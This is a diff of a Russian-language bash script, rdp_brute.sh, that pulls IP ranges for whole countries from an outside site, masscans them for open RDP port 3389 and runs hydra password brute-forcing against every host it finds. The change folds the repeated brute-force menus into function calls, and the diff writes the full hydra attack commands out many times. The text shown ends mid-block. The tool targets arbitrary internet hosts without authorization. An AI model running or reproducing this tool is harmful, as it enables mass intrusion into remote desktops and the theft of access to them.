@@ -10031,6 +4074,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10040,53 +4084,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -10104,6 +4102,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10113,53 +4112,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -10177,6 +4130,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10186,53 +4140,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -10250,6 +4158,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10259,53 +4168,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -10323,6 +4186,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10332,53 +4196,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -10396,6 +4214,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10405,53 +4224,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -10469,6 +4242,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10478,53 +4252,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -10542,6 +4270,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10551,53 +4280,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -10615,6 +4298,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10624,53 +4308,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 else
 if [ "$country" = "142" ]; then
 curl http://ipdiapazon.16mb.com/Pakistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -10686,6 +4324,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10695,53 +4334,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -10759,6 +4352,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10768,53 +4362,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "144" ]; then
@@ -10831,6 +4379,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10840,53 +4389,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -10904,6 +4407,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10913,53 +4417,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -10977,6 +4435,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -10986,53 +4445,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
